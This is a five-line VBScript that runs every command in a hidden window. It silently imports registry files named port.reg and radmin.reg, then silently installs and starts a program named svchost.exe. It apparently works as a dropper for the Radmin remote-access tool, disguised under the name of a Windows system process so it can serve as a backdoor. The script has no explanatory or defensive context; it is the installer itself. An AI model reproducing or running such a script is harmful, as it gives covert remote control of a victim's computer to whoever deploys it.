   set ws=wscript.createobject("wscript.shell")
   ws.run "regedit.exe /s port.reg",0
   ws.run "regedit.exe /s radmin.reg",0
   ws.run "svchost.exe /install /silence",0
   ws.run "svchost.exe /start",0
